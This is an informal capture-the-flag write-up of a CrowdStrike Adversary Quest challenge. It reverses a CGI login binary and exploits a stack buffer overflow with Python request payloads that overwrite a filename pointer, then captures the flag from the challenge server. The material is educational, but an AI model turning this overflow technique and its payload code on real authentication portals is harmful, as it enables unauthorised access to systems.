# Crowdstrike Adversary Quest 2021 / Protective Penguin / #1 Portal

## Challenge Description
PROTECTIVE PENGUIN gained access to one of their victims through the victim's extranet authentication portals and we were asked to investigate.
Please download the Portal Code and see whether you can reproduce their means of initial access vector. We stood up a test instance of the authentication portal for you to validate against.
NOTE: Flags will be easily identifiable by following the format CS{some_secret_flag_text}. They must be submitted in full, including the CS{ and } parts.

## Authentication Portal, Local Files
The archive for the test instance contains the following files:
```
./index.html
./run.sh
./cgi-bin
./cgi-bin/portal.cgi
./creds.txt
```

For testing purposes, use run.sh to fire up a local webserver through python...
```
#!/bin/sh
export FLAG=CS{foobar}
python3 -m http.server --cgi --bind 127.0.0.1
```
```
./run.sh 
Serving HTTP on 127.0.0.1 port 8000 (http://127.0.0.1:8000/) ...
```
... serving a rather simple web page resembling a VPN login.
![VPN login page](pics/1.png)

### Page Source
The login form uses an inline Javascript function *auth()* on submitting data for the fields *input_username* and *input_password*...
```javascript
function auth() {
  let creds = {
    user: btoa(document.getElementById("input_username").value),
    pass: btoa(document.getElementById("input_password").value)
  };
  if (!creds.user) {
    notification("Empty username", "warning");
    return;
  }
  if (!creds.pass) {
    notification("Empty password", "warning");
    return;
  }

  fetch("/cgi-bin/portal.cgi", {
    method: "POST",
    body: JSON.stringify(creds),
  }).then(function (response) {
    return response.text();
  }).then(function (data) {
    let json = JSON.parse(data);
    if (json.status == "success") {
      notification(`Login success: ${json.flag}`, "success");
[...]
```
... which base64 encodes both field values and delivers them via HTTP POST as JSON to the CGI program */cgi-bin/portal.cgi*.
A test run with admin/admin creds looks like this:
```json
{"user":"YWRtaW4=","pass":"YWRtaW4="}
```

/usr/bin/checksec --file=cgi-bin/portal.cgi
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               3               cgi-bin/portal.cgi

reversing portal.cgi

high level:
main -> calls validate_creds with params b64_user, b64_pass
validate opens creds.txt, reads line by line, compares for valid creds
validate_creds returns 0 on success
main -> print flag on success

validate_creds has stack laylout
.text:0000000000401226                   lpb64password= qword ptr -240h
.text:0000000000401226                   lpb64username= qword ptr -238h
.text:0000000000401226                   stream= qword ptr -230h
.text:0000000000401226                   length_of_current_creds_line= qword ptr -228h
.text:0000000000401226                   var_220= dword ptr -220h
.text:0000000000401226                   var_21C= byte ptr -21Ch
.text:0000000000401226                   filename= qword ptr -18h
.text:0000000000401226                   stackCookie= qword ptr -8

var_220 is used as exit value (0 for success)
parsing of server local creds.txt happens line by line, reading up to 100h bytes with fgets into var_220 + 4 (range variable from -21Ch up to -11Dh)
b64 decoded username (up to 100h) bytes are saved to var_220 + 104 (range variable, from -11Ch up to -1Dh)
then a colon is added to decoded username (with max username length, e.g. at -1Ch)
b64 decoded password (up to 100h) bytes are saved to var_220 + 104 + strlen(username) + 1
with max size username from -1B up to and beyond stack frame border.


strings -t x portal.cgi
    2a8 /lib64/ld-linux-x86-64.so.2

LOAD:00000000004002A8 aLib64LdLinuxX8 db '/lib64/ld-linux-x86-64.so.2',0

nope: its the right way, only path in non-dynamic memory is
fill up pass with \0 and then overwrite filename with offset $rax  : 0x00000000004002a8 → "/lib64/ld-linux-x86-64.so.2"

-> goal: user:pass combo to overwrite filename offset with 0x00000000004002a8
try with debug

ps auxwwg
kali      741831  0.0  0.0   2416   372 pts/0    S+   20:16   0:00 /bin/sh ./run.sh
kali      741832  0.0  0.9 245352 13628 pts/0    S+   20:16   0:01 python3 -m http.server --cgi --bind 127.0.0.1

gdb -p 741832

set follow-fork-mode child
set detach-on-fork off
b *0x401434     # main
b *0x401226     # validate_creds (see i64)
b *0x040131A    # fopen

gef➤  continue 
Continuing.
[New Thread 0x7fecaa6b6700 (LWP 743153)]
[Attaching after Thread 0x7fecaa6b6700 (LWP 743153) fork to child process 743154]
[New inferior 2 (process 743154)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Reading symbols from /usr/lib/debug/.build-id/2c/c4e3a93e8ef0f4dee8f77225701d988f97b9c7.debug...
Reading symbols from /usr/lib/debug/.build-id/5b/d08b8a2b8511c50cc5e38aac39305cfcae72f0.debug...
Reading symbols from /usr/lib/debug/.build-id/f5/efbcea815d5c6da19e62263f67ca63f8bedeb6.debug...
Reading symbols from /usr/lib/debug/.build-id/e8/ef1ac73913c5833fc0088ea41bc3331db60ae2.debug...
Reading symbols from /usr/lib/debug/.build-id/a5/a3c3f65fd94f4c7f323a175707c3a79cbbd614.debug...
Reading symbols from /usr/lib/debug/.build-id/63/7706dbbbd112d03fbad61ca30125b48e60aa92.debug...
Reading symbols from /usr/lib/debug/.build-id/a4/94b325fdefe9742c94fcd34c583c08733d2318.debug...
process 743154 is executing new program: /mnt/hgfs/Crowdstrike-Adversary-Quest-2021/protective penguin/portal/authportal/cgi-bin/portal.cgi
Reading symbols from /usr/lib/debug/.build-id/63/7706dbbbd112d03fbad61ca30125b48e60aa92.debug...
Reading symbols from /usr/lib/debug/.build-id/97/0fa8cc35554ed6f4feb2d663067310d48cadb4.debug...
Reading symbols from /usr/lib/debug/.build-id/a5/a3c3f65fd94f4c7f323a175707c3a79cbbd614.debug...
[Switching to process 743154]

Thread 2.1 "portal.cgi" hit Breakpoint 1, 0x0000000000401434 in ?? ()

# first line read with fgets from /lib64/...

00001420: 0348 8d3c 9248 01ff 4829 f841 0fb6 3c01  .H.<.H..H).A..<.
00001430: 4889 c848 89d1 4188 3a48 83f8 0977 d14c  H..H..A.:H...w.L
00001440: 89d8 ba19 0000 0049 89e3 4c29 d048 83f8  .......I..L).H..

gef➤  x/200x $rsi
0x7ffde4289cd4: 0x48    0x29    0xf8    0x41    0x0f    0xb6    0x3c    0x01
0x7ffde4289cdc: 0x48    0x89    0xc8    0x48    0x89    0xd1    0x41    0x88
0x7ffde4289ce4: 0x3a    0x48    0x83    0xf8    0x09    0x77    0xd1    0x4c
0x7ffde4289cec: 0x89    0xd8    0xba    0x19    0x00    0x00    0x00    0x49

we have 16 chars for username, colon, and then 11 chars pass before first \0
fill up pass with \0 and then overwrite filename with offset $rax  : 0x00000000004002a8 → "/lib64/ld-linux-x86-64.so.2"

>>> import requests
>>> from base64 import b64encode
>>> import json
>>> data['user'] = b64encode(b'\x48\x29\xf8\x41\x0f\xb6\x3c\x01\x48\x89\xc8\x48\x89\xd1\x41\x88').decode('utf-8')
>>> data['pass'] = b64encode(b'\x48\x83\xf8\x09\x77\xd1\x4c\x89\xd8\xba\x19' + b'\x00'*232 + b'\xa8\x02\x40').decode('utf-8')
>>> requests.post('http://127.0.0.1:8000/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "success", "flag": "CS{foobar}"}'

>>> requests.post('https://authportal.challenges.adversary.zone:8880/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "err"}'

exploit works locally, but seems to fail on remote server
-> could be because the /lib64/ link is a soft link and might be a different version on server?
-> some memory issue?

grep for more colons, which might be less library version dependent

00022460: 6b00 0a70 7265 6c69 6e6b 2063 6865 636b  k..prelink check
00022470: 696e 673a 2025 730a 0066 6169 6c65 6400  ing: %s..failed.

>>> data['user'] = b64encode(b'prelink checking').decode('utf-8')
>>> data['pass'] = b64encode(b' %s' + b'\x00'*(260-16-1-3) + b'\xa8\x02\x40').decode('utf-8')
>>> requests.post('http://127.0.0.1:8000/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "success", "flag": "CS{foobar}"}'
>>> requests.post('https://authportal.challenges.adversary.zone:8880/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "success", "flag": "CS{w3b_vPn_h4xx}"}'

flag: CS{w3b_vPn_h4xx}
